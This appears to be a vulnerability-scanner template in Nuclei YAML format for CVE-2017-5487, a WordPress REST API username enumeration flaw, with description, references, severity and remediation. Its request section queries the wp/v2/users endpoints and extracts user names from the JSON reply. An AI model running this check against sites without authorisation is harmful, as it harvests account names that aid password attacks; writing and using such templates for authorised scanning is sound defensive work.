id: CVE-2017-5487
info:
  name: WordPress Core < 4.7.1 - Username Enumeration
  author:
  - l0ne1y
  tags:
  - cve
  - cve2017
  - wordpress
  description: |-
    WordPress wp-json/wp/v2/users 信息泄漏漏洞
    WordPress是WordPress软件基金会的一套使用PHP语言开发的博客平台。该平台支持在PHP和MySQL的服务器上架设个人博客网站。

    WordPress中的REST API实现过程中的wp-includes/rest-api/endpoints/class-wp-rest-users-controller.php文件存在安全漏洞。远程攻击者可通过向wp-json/wp/v2/users发送请求利用该漏洞获取敏感信息。
  reference:
  - https://www.exploit-db.com/exploits/41497
  - https://nvd.nist.gov/vuln/detail/cve-2017-5487
  - https://www.wordfence.com/blog/2016/12/wordfence-blocks-username-harvesting-via-new-rest-api-wp-4-7/
  - https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
  severity: medium
  classification:
    cve-id:
    - cve-2017-5487
    cwe-id:
    - cwe-200
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
  remediation: |-
    官方修复方案：
    1.目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
    https://wordpress.org/news/2017/01/wordpress-4-7-1-security-and-maintenance-release/
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    part: header
    words:
    - application/json
  - type: word
    condition: and
    words:
    - '"id":'
    - '"name":'
    - '"avatar_urls":'
  extractors:
  - type: json
    json:
    - .[].name
  matchers-condition: and
  path:
  - '{{BaseURL}}/wp-json/wp/v2/users/'
  - '{{BaseURL}}/?rest_route=/wp/v2/users/'
  method: GET
  stop-at-first-match: true
